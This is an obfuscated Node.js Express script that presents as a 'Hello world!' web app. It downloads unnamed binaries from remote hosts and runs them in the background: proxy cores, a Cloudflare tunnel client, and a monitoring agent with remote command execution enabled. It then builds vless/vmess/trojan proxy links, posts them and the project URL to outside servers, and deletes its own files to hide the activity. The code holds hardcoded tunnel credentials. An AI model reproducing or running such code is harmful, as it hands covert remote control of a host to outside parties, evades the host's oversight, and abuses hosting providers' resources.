const _0x598409=_0x5941;(function(_0x2249ef,_0x34bbc7){const _0x52e550=_0x5941,_0x32ec6a=_0x2249ef();while(!![]){try{const _0xf5478c=parseInt(_0x52e550(0x1bf))/0x1*(-parseInt(_0x52e550(0x1d1))/0x2)+parseInt(_0x52e550(0x1c9))/0x3+-parseInt(_0x52e550(0x1c0))/0x4*(-parseInt(_0x52e550(0x1fa))/0x5)+parseInt(_0x52e550(0x220))/0x6+parseInt(_0x52e550(0x1ad))/0x7*(-parseInt(_0x52e550(0x24d))/0x8)+-parseInt(_0x52e550(0x1a7))/0x9+parseInt(_0x52e550(0x21c))/0xa*(parseInt(_0x52e550(0x23b))/0xb);if(_0xf5478c===_0x34bbc7)break;else _0x32ec6a['push'](_0x32ec6a['shift']());}catch(_0x478a53){_0x32ec6a['push'](_0x32ec6a['shift']());}}}(_0x4a18,0x859da));const express=require(_0x598409(0x252)),app=express(),axios=require(_0x598409(0x1f9)),os=require('os'),fs=require('fs'),path=require(_0x598409(0x1a3)),{promisify}=require(_0x598409(0x1d9)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x598409(0x1f5)),UPLOAD_URL=process[_0x598409(0x1e4)][_0x598409(0x1ee)]||'',PROJECT_URL=process[_0x598409(0x1e4)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x598409(0x1e4)][_0x598409(0x24b)]||![],FILE_PATH=process[_0x598409(0x1e4)]['FILE_PATH']||_0x598409(0x1cf),SUB_PATH=process['env'][_0x598409(0x232)]||_0x598409(0x227),PORT=process[_0x598409(0x1e4)]['SERVER_PORT']||process[_0x598409(0x1e4)][_0x598409(0x238)]||0xbb8,UUID=process[_0x598409(0x1e4)]['UUID']||_0x598409(0x1ba),NEZHA_SERVER=process[_0x598409(0x1e4)][_0x598409(0x1db)]||_0x598409(0x203),NEZHA_PORT=process[_0x598409(0x1e4)][_0x598409(0x231)]||'',NEZHA_KEY=process[_0x598409(0x1e4)][_0x598409(0x249)]||_0x598409(0x20a),ARGO_DOMAIN=process[_0x598409(0x1e4)][_0x598409(0x1a1)]||_0x598409(0x225),ARGO_AUTH=process[_0x598409(0x1e4)]['ARGO_AUTH']||'eyJhIjoiMGM5OTAwNTJmZjBiYzFmYTllMjBlOWUzNGFiOGM4NzciLCJ0IjoiYTcyMDM5NTctNmUzZS00OGVkLTk0MmItYjNjOTdkNGIzYjIyIiwicyI6IlpXUTFNV0ptWm1ZdE1XUXpPUzAwTWpCaUxXSXhNak10TkRFNU5qTmhaVGRoTldNeSJ9',ARGO_PORT=process[_0x598409(0x1e4)][_0x598409(0x1ea)]||0x1f41,CFIP=process[_0x598409(0x1e4)][_0x598409(0x1e5)]||'www.visa.com.sg',CFPORT=process['env'][_0x598409(0x248)]||0x1bb,NAME=process['env'][_0x598409(0x22f)]||_0x598409(0x24c);!fs[_0x598409(0x211)](FILE_PATH)?(fs[_0x598409(0x234)](FILE_PATH),console['log'](FILE_PATH+_0x598409(0x229))):console[_0x598409(0x1c6)](FILE_PATH+_0x598409(0x1ce));let npmPath=path[_0x598409(0x242)](FILE_PATH,_0x598409(0x230)),phpPath=path[_0x598409(0x242)](FILE_PATH,_0x598409(0x1f4)),webPath=path['join'](FILE_PATH,_0x598409(0x1f1)),botPath=path[_0x598409(0x242)](FILE_PATH,'bot'),subPath=path[_0x598409(0x242)](FILE_PATH,_0x598409(0x204)),listPath=path[_0x598409(0x242)](FILE_PATH,_0x598409(0x1d7)),bootLogPath=path[_0x598409(0x242)](FILE_PATH,_0x598409(0x1ef)),configPath=path['join'](FILE_PATH,_0x598409(0x236));function deleteNodes(){const _0x450785=_0x598409;try{if(!UPLOAD_URL)return;if(!fs[_0x450785(0x211)](subPath))return;let _0x345e81;try{_0x345e81=fs[_0x450785(0x202)](subPath,'utf-8');}catch{return null;}const _0xbbea61=Buffer[_0x450785(0x1fd)](_0x345e81,_0x450785(0x21f))[_0x450785(0x21e)](_0x450785(0x22d)),_0x859526=_0xbbea61[_0x450785(0x210)]('\x0a')['filter'](_0x17a3d4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x450785(0x1b9)](_0x17a3d4));if(_0x859526[_0x450785(0x244)]===0x0)return;return axios[_0x450785(0x21a)](UPLOAD_URL+_0x450785(0x21d),JSON[_0x450785(0x1a8)]({'nodes':_0x859526}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x52a325=>{return null;});}catch(_0x6a457e){return null;}}function cleanupOldFiles(){const _0x14959d=_0x598409,_0x595798=['web',_0x14959d(0x240),_0x14959d(0x230),_0x14959d(0x1f4),_0x14959d(0x204),_0x14959d(0x1ef)];_0x595798[_0x14959d(0x1de)](_0x135deb=>{const _0x49a6f4=_0x14959d,_0x1d82e9=path['join'](FILE_PATH,_0x135deb);fs[_0x49a6f4(0x1a5)](_0x1d82e9,()=>{});});}app[_0x598409(0x247)]('/',function(_0x37bf1b,_0x40243e){const _0x44e29c=_0x598409;_0x40243e[_0x44e29c(0x1b4)](_0x44e29c(0x20f));});const config={'log':{'access':'/dev/null','error':_0x598409(0x206),'loglevel':_0x598409(0x1b5)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x598409(0x1ed),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x598409(0x1b5),'fallbacks':[{'dest':0xbb9},{'path':_0x598409(0x1c3),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x598409(0x237),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x598409(0x1ed),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x598409(0x239),'security':_0x598409(0x1b5)}},{'port':0xbba,'listen':_0x598409(0x1aa),'protocol':_0x598409(0x1ed),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x598409(0x1b5),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x598409(0x20b),_0x598409(0x1e1),_0x598409(0x1b6)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x598409(0x1aa),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x598409(0x218)}},'sniffing':{'enabled':!![],'destOverride':[_0x598409(0x20b),_0x598409(0x1e1),_0x598409(0x1b6)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x598409(0x1aa),'protocol':_0x598409(0x235),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x598409(0x1b5),'wsSettings':{'path':_0x598409(0x237)}},'sniffing':{'enabled':!![],'destOverride':[_0x598409(0x20b),_0x598409(0x1e1),_0x598409(0x1b6)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x598409(0x1f7),'tag':_0x598409(0x1f3)},{'protocol':_0x598409(0x1b3),'tag':_0x598409(0x24f)}]};fs[_0x598409(0x1c4)](path['join'](FILE_PATH,'config.json'),JSON[_0x598409(0x1a8)](config,null,0x2));function _0x4a18(){const _0x2ad93c=['2febab0a-f90b-4548-9a27-05e57659dc62','\x0a\x20\x20credentials-file:\x20','&path=%2Fvless-argo%3Fed%3D2560#','./web','/php\x20-c\x20\x22','936707LfEyNy','9032lTQkUn','bot\x20is\x20running','Download\x20','/vless-argo','writeFileSync','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','log','/config.json\x20>/dev/null\x202>&1\x20&','http\x20server\x20is\x20running\x20on\x20port:','417534SOCnYr','has','&type=ws&host=','listen','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x20already\x20exists','./tmp','Content-Type','2zlxdBg','message','push','/api/add-subscriptions','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','unshift','list.txt','finish','util','/web\x20-c\x20','NEZHA_SERVER','close','chmod','forEach','php\x20running\x20error:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','tls','Empowerment\x20failed\x20for\x20','\x20>/dev/null\x202>&1\x20&','env','CFIP','Error\x20executing\x20command:\x20','2096','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','bot\x20is\x20running.','ARGO_PORT','2083','?encryption=none&security=tls&sni=','vless','UPLOAD_URL','boot.log','status','web','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','direct','php','child_process','添加URL失败:\x20','freedom','https://arm64.ssss.nyc.mn/web','axios','1015CDGMnR','8443','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','from','TunnelSecret','2087','2053','https://amd64.ssss.nyc.mn/v1','readFileSync','nezha.520961.xyz:8008','sub.txt','response','/dev/null','\x0a\x20\x20\x0avmess://','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','rUYLjmYX54qvUp8vc06JQTGaJcSwzPh7','http','/tunnel.yml\x20run','/npm\x20-s\x20','\x0a\x20\x20\x20\x20','Hello\x20world!','split','existsSync','./npm','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','npm\x20is\x20running','ARGO_DOMAIN:','includes','true','/vmess-argo','?security=tls&sni=','post','\x20failed:\x20','30HiAdPe','/api/delete-nodes','toString','base64','1223220NcAdjL','stream','https://amd64.ssss.nyc.mn/2go','createWriteStream','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','galaxy.ttxf.dpdns.org','/api/add-nodes','sub','fileUrl','\x20is\x20created','map','php\x20is\x20running','Empowerment\x20success\x20for\x20','utf-8','arm','NAME','npm','NEZHA_PORT','SUB_PATH','./bot','mkdirSync','trojan','config.json','/trojan-argo','PORT','tcp','trim','4883219FkqgDa','aarch64','https://oooo.serv00.net/add-url','automatic\x20access\x20task\x20added\x20successfully','\x20-p\x20','bot','rm\x20-rf\x20','join','Subscription\x20uploaded\x20successfully','length','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','get','CFPORT','NEZHA_KEY','tunnel.json','AUTO_ACCESS','Vls','50632rIBUqS','ArgoDomain:','block','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','443','express','Skipping\x20adding\x20automatic\x20access\x20task','ARGO_DOMAIN','application/json','path','\x0avless://','unlink','/sub.txt\x20saved\x20successfully','1115145ntzjqj','stringify','tunnel.yml','127.0.0.1','error','NEZHA\x20variable\x20is\x20empty,skip\x20running','581FVbBnE','\x0aclient_secret:\x20','web\x20is\x20running','nohup\x20','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','\x20successfully','blackhole','send','none','quic','match','all','test'];_0x4a18=function(){return _0x2ad93c;};return _0x4a18();}function getSystemArchitecture(){const _0x337849=_0x598409,_0x58efbc=os['arch']();return _0x58efbc==='arm'||_0x58efbc==='arm64'||_0x58efbc===_0x337849(0x23c)?'arm':'amd';}function downloadFile(_0x54179b,_0x48dd40,_0x3012b7){const _0x71ca0=_0x598409,_0x4f0486=path[_0x71ca0(0x242)](FILE_PATH,_0x54179b),_0x34078b=fs[_0x71ca0(0x223)](_0x4f0486);axios({'method':_0x71ca0(0x247),'url':_0x48dd40,'responseType':_0x71ca0(0x221)})['then'](_0x451cb2=>{const _0x278366=_0x71ca0;_0x451cb2['data']['pipe'](_0x34078b),_0x34078b['on'](_0x278366(0x1d8),()=>{const _0x4cf029=_0x278366;_0x34078b[_0x4cf029(0x1dc)](),console[_0x4cf029(0x1c6)](_0x4cf029(0x1c2)+_0x54179b+_0x4cf029(0x1b2)),_0x3012b7(null,_0x54179b);}),_0x34078b['on'](_0x278366(0x1ab),_0x5941e8=>{const _0x11d380=_0x278366;fs['unlink'](_0x4f0486,()=>{});const _0x4bf17b=_0x11d380(0x1c2)+_0x54179b+_0x11d380(0x21b)+_0x5941e8[_0x11d380(0x1d2)];console[_0x11d380(0x1ab)](_0x4bf17b),_0x3012b7(_0x4bf17b);});})['catch'](_0x23690c=>{const _0x26a350=_0x71ca0,_0x55eaad=_0x26a350(0x1c2)+_0x54179b+_0x26a350(0x21b)+_0x23690c[_0x26a350(0x1d2)];console[_0x26a350(0x1ab)](_0x55eaad),_0x3012b7(_0x55eaad);});}async function downloadFilesAndRun(){const _0xa949dc=_0x598409,_0x29e451=getSystemArchitecture(),_0x2ae68a=getFilesForArchitecture(_0x29e451);if(_0x2ae68a[_0xa949dc(0x244)]===0x0){console['log'](_0xa949dc(0x213));return;}const _0x3a596a=_0x2ae68a[_0xa949dc(0x22a)](_0x4361ce=>{return new Promise((_0x4cc2de,_0x3e0481)=>{const _0x3727fc=_0x5941;downloadFile(_0x4361ce['fileName'],_0x4361ce[_0x3727fc(0x228)],(_0x5b1a89,_0x3a6979)=>{_0x5b1a89?_0x3e0481(_0x5b1a89):_0x4cc2de(_0x3a6979);});});});try{await Promise[_0xa949dc(0x1b8)](_0x3a596a);}catch(_0x292834){console[_0xa949dc(0x1ab)]('Error\x20downloading\x20files:',_0x292834);return;}function _0x1cad75(_0x3dcebb){const _0x3260c6=0x1fd;_0x3dcebb['forEach'](_0x46aa34=>{const _0x51d019=_0x5941,_0x19aee0=path[_0x51d019(0x242)](FILE_PATH,_0x46aa34);fs[_0x51d019(0x211)](_0x19aee0)&&fs[_0x51d019(0x1dd)](_0x19aee0,_0x3260c6,_0x5a7072=>{const _0x5a8f02=_0x51d019;_0x5a7072?console[_0x5a8f02(0x1ab)](_0x5a8f02(0x1e2)+_0x19aee0+':\x20'+_0x5a7072):console[_0x5a8f02(0x1c6)](_0x5a8f02(0x22c)+_0x19aee0+':\x20'+_0x3260c6['toString'](0x8));});});}const _0x5e152b=NEZHA_PORT?[_0xa949dc(0x212),_0xa949dc(0x1bd),_0xa949dc(0x233)]:['./php',_0xa949dc(0x1bd),_0xa949dc(0x233)];_0x1cad75(_0x5e152b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x26a69d=NEZHA_SERVER[_0xa949dc(0x216)](':')?NEZHA_SERVER[_0xa949dc(0x210)](':')['pop']():'',_0x429894=new Set([_0xa949dc(0x251),_0xa949dc(0x1fb),_0xa949dc(0x1e7),_0xa949dc(0x1ff),_0xa949dc(0x1eb),_0xa949dc(0x200)]),_0x2a150e=_0x429894[_0xa949dc(0x1ca)](_0x26a69d)?_0xa949dc(0x217):'false',_0x11a47f=_0xa949dc(0x1ae)+NEZHA_KEY+_0xa949dc(0x209)+NEZHA_SERVER+_0xa949dc(0x1b1)+_0x2a150e+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0xa949dc(0x242)](FILE_PATH,'config.yaml'),_0x11a47f);const _0x3e0be5=_0xa949dc(0x1b0)+FILE_PATH+_0xa949dc(0x1be)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3e0be5),console[_0xa949dc(0x1c6)](_0xa949dc(0x22b)),await new Promise(_0x2de270=>setTimeout(_0x2de270,0x3e8));}catch(_0x1d86e1){console['error'](_0xa949dc(0x1df)+_0x1d86e1);}}else{let _0x564b1c='';const _0x366790=['443',_0xa949dc(0x1fb),'2096','2087',_0xa949dc(0x1eb),_0xa949dc(0x200)];_0x366790[_0xa949dc(0x216)](NEZHA_PORT)&&(_0x564b1c='--tls');const _0xbd0b5=_0xa949dc(0x1b0)+FILE_PATH+_0xa949dc(0x20d)+NEZHA_SERVER+':'+NEZHA_PORT+_0xa949dc(0x23f)+NEZHA_KEY+'\x20'+_0x564b1c+_0xa949dc(0x1e3);try{await exec(_0xbd0b5),console[_0xa949dc(0x1c6)](_0xa949dc(0x214)),await new Promise(_0x5b5d08=>setTimeout(_0x5b5d08,0x3e8));}catch(_0x490f92){console[_0xa949dc(0x1ab)]('npm\x20running\x20error:\x20'+_0x490f92);}}}else console[_0xa949dc(0x1c6)](_0xa949dc(0x1ac));const _0x3a3da5='nohup\x20'+FILE_PATH+_0xa949dc(0x1da)+FILE_PATH+_0xa949dc(0x1c7);try{await exec(_0x3a3da5),console[_0xa949dc(0x1c6)](_0xa949dc(0x1af)),await new Promise(_0x56660a=>setTimeout(_0x56660a,0x3e8));}catch(_0x43494f){console['error']('web\x20running\x20error:\x20'+_0x43494f);}if(fs[_0xa949dc(0x211)](path[_0xa949dc(0x242)](FILE_PATH,_0xa949dc(0x240)))){let _0x281e36;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x281e36=_0xa949dc(0x245)+ARGO_AUTH;else ARGO_AUTH[_0xa949dc(0x1b7)](/TunnelSecret/)?_0x281e36='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0xa949dc(0x20c):_0x281e36=_0xa949dc(0x224)+FILE_PATH+_0xa949dc(0x1fc)+ARGO_PORT;try{await exec(_0xa949dc(0x1b0)+FILE_PATH+'/bot\x20'+_0x281e36+'\x20>/dev/null\x202>&1\x20&'),console['log'](_0xa949dc(0x1c1)),await new Promise(_0x64de9a=>setTimeout(_0x64de9a,0x7d0));}catch(_0x3f503f){console['error']('Error\x20executing\x20command:\x20'+_0x3f503f);}}await new Promise(_0x401108=>setTimeout(_0x401108,0x1388));}function getFilesForArchitecture(_0x677f28){const _0x156848=_0x598409;let _0x25cd41;_0x677f28==='arm'?_0x25cd41=[{'fileName':'web','fileUrl':_0x156848(0x1f8)},{'fileName':_0x156848(0x240),'fileUrl':'https://arm64.ssss.nyc.mn/2go'}]:_0x25cd41=[{'fileName':_0x156848(0x1f1),'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':_0x156848(0x240),'fileUrl':_0x156848(0x222)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3a54a6=_0x677f28===_0x156848(0x22e)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x25cd41[_0x156848(0x1d6)]({'fileName':_0x156848(0x230),'fileUrl':_0x3a54a6});}else{const _0x483f27=_0x677f28===_0x156848(0x22e)?'https://arm64.ssss.nyc.mn/v1':_0x156848(0x201);_0x25cd41['unshift']({'fileName':_0x156848(0x1f4),'fileUrl':_0x483f27});}}return _0x25cd41;}function argoType(){const _0x27ea32=_0x598409;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x27ea32(0x1f2));return;}if(ARGO_AUTH[_0x27ea32(0x216)](_0x27ea32(0x1fe))){fs[_0x27ea32(0x1c4)](path[_0x27ea32(0x242)](FILE_PATH,_0x27ea32(0x24a)),ARGO_AUTH);const _0x512bf1='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x27ea32(0x1bb)+path['join'](FILE_PATH,_0x27ea32(0x24a))+_0x27ea32(0x1e8)+ARGO_DOMAIN+_0x27ea32(0x1e0)+ARGO_PORT+_0x27ea32(0x1cd);fs[_0x27ea32(0x1c4)](path[_0x27ea32(0x242)](FILE_PATH,_0x27ea32(0x1a9)),_0x512bf1);}else console['log'](_0x27ea32(0x250));}argoType();async function extractDomains(){const _0x42193e=_0x598409;let _0x4a5c10;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4a5c10=ARGO_DOMAIN,console[_0x42193e(0x1c6)](_0x42193e(0x215),_0x4a5c10),await _0x203017(_0x4a5c10);else try{const _0x55ba45=fs[_0x42193e(0x202)](path[_0x42193e(0x242)](FILE_PATH,_0x42193e(0x1ef)),_0x42193e(0x22d)),_0x25600b=_0x55ba45[_0x42193e(0x210)]('\x0a'),_0x5c7f00=[];_0x25600b[_0x42193e(0x1de)](_0x5b9cc7=>{const _0xc755e7=_0x42193e,_0xe3bdbb=_0x5b9cc7[_0xc755e7(0x1b7)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xe3bdbb){const _0x56d216=_0xe3bdbb[0x1];_0x5c7f00[_0xc755e7(0x1d3)](_0x56d216);}});if(_0x5c7f00[_0x42193e(0x244)]>0x0)_0x4a5c10=_0x5c7f00[0x0],console[_0x42193e(0x1c6)](_0x42193e(0x24e),_0x4a5c10),await _0x203017(_0x4a5c10);else{console[_0x42193e(0x1c6)](_0x42193e(0x1c5)),fs['unlinkSync'](path[_0x42193e(0x242)](FILE_PATH,_0x42193e(0x1ef)));async function _0x1a998c(){const _0x2eae53=_0x42193e;try{await exec(_0x2eae53(0x246));}catch(_0x11d95b){}}_0x1a998c(),await new Promise(_0xf9d7d6=>setTimeout(_0xf9d7d6,0xbb8));const _0x45c491=_0x42193e(0x224)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x42193e(0x1b0)+path[_0x42193e(0x242)](FILE_PATH,'bot')+'\x20'+_0x45c491+_0x42193e(0x1e3)),console[_0x42193e(0x1c6)](_0x42193e(0x1e9)),await new Promise(_0x3ddcae=>setTimeout(_0x3ddcae,0xbb8)),await extractDomains();}catch(_0x1ae9fe){console[_0x42193e(0x1ab)](_0x42193e(0x1e6)+_0x1ae9fe);}}}catch(_0x38e42d){console[_0x42193e(0x1ab)]('Error\x20reading\x20boot.log:',_0x38e42d);}async function _0x203017(_0x13c546){const _0x58a863=_0x42193e,_0x2439ff=execSync(_0x58a863(0x1d5),{'encoding':_0x58a863(0x22d)}),_0x1d4917=_0x2439ff[_0x58a863(0x23a)]();return new Promise(_0x5aad67=>{setTimeout(()=>{const _0x11583a=_0x5941,_0x394b5c={'v':'2','ps':NAME+'-'+_0x1d4917,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x11583a(0x1b5),'net':'ws','type':_0x11583a(0x1b5),'host':_0x13c546,'path':'/vmess-argo?ed=2560','tls':_0x11583a(0x1e1),'sni':_0x13c546,'alpn':''},_0xdbf7e8=_0x11583a(0x1a4)+UUID+'@'+CFIP+':'+CFPORT+_0x11583a(0x1ec)+_0x13c546+_0x11583a(0x1cb)+_0x13c546+_0x11583a(0x1bc)+NAME+'-'+_0x1d4917+_0x11583a(0x207)+Buffer[_0x11583a(0x1fd)](JSON[_0x11583a(0x1a8)](_0x394b5c))[_0x11583a(0x21e)](_0x11583a(0x21f))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x11583a(0x219)+_0x13c546+'&type=ws&host='+_0x13c546+_0x11583a(0x208)+NAME+'-'+_0x1d4917+_0x11583a(0x20e);console[_0x11583a(0x1c6)](Buffer[_0x11583a(0x1fd)](_0xdbf7e8)[_0x11583a(0x21e)](_0x11583a(0x21f))),fs['writeFileSync'](subPath,Buffer['from'](_0xdbf7e8)['toString'](_0x11583a(0x21f))),console[_0x11583a(0x1c6)](FILE_PATH+_0x11583a(0x1a6)),uplodNodes(),app[_0x11583a(0x247)]('/'+SUB_PATH,(_0x2b54a9,_0x948a1)=>{const _0x39545f=_0x11583a,_0x44f0b2=Buffer[_0x39545f(0x1fd)](_0xdbf7e8)[_0x39545f(0x21e)](_0x39545f(0x21f));_0x948a1['set'](_0x39545f(0x1d0),'text/plain;\x20charset=utf-8'),_0x948a1[_0x39545f(0x1b4)](_0x44f0b2);}),_0x5aad67(_0xdbf7e8);},0x7d0);});}}async function uplodNodes(){const _0x1a8a4f=_0x598409;if(UPLOAD_URL&&PROJECT_URL){const _0x4a77ad=PROJECT_URL+'/'+SUB_PATH,_0x35989e={'subscription':[_0x4a77ad]};try{const _0x125071=await axios[_0x1a8a4f(0x21a)](UPLOAD_URL+_0x1a8a4f(0x1d4),_0x35989e,{'headers':{'Content-Type':'application/json'}});if(_0x125071[_0x1a8a4f(0x1f0)]===0xc8)console['log']('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x54758f){if(_0x54758f[_0x1a8a4f(0x205)]){if(_0x54758f[_0x1a8a4f(0x205)][_0x1a8a4f(0x1f0)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x32d765=fs[_0x1a8a4f(0x202)](listPath,_0x1a8a4f(0x22d)),_0x1ba250=_0x32d765[_0x1a8a4f(0x210)]('\x0a')['filter'](_0x233491=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1a8a4f(0x1b9)](_0x233491));if(_0x1ba250[_0x1a8a4f(0x244)]===0x0)return;const _0x17bda3=JSON[_0x1a8a4f(0x1a8)]({'nodes':_0x1ba250});try{await axios[_0x1a8a4f(0x21a)](UPLOAD_URL+_0x1a8a4f(0x226),_0x17bda3,{'headers':{'Content-Type':_0x1a8a4f(0x1a2)}});if(response[_0x1a8a4f(0x1f0)]===0xc8)console[_0x1a8a4f(0x1c6)](_0x1a8a4f(0x243));else return null;}catch(_0x175976){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x16f1e3=_0x5941,_0x3f173e=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x3f173e['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3f173e['push'](phpPath);exec(_0x16f1e3(0x241)+_0x3f173e[_0x16f1e3(0x242)]('\x20')+'\x20>/dev/null\x202>&1',_0x405bd9=>{const _0x4e7472=_0x16f1e3;console['clear'](),console[_0x4e7472(0x1c6)]('App\x20is\x20running'),console[_0x4e7472(0x1c6)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5a71c4=_0x598409;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5a71c4(0x1c6)](_0x5a71c4(0x253));return;}try{const _0x49bd61=await axios['post'](_0x5a71c4(0x23d),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5a71c4(0x1a2)}});console['log'](_0x5a71c4(0x23e));}catch(_0x5afd3c){console[_0x5a71c4(0x1ab)](_0x5a71c4(0x1f6)+_0x5afd3c[_0x5a71c4(0x1d2)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}function _0x5941(_0x4be414,_0x4f6a78){const _0x4a18d9=_0x4a18();return _0x5941=function(_0x59413c,_0x3ff262){_0x59413c=_0x59413c-0x1a1;let _0x5bb557=_0x4a18d9[_0x59413c];return _0x5bb557;},_0x5941(_0x4be414,_0x4f6a78);}startserver(),app[_0x598409(0x1cc)](PORT,()=>console['log'](_0x598409(0x1c8)+PORT+'!'));
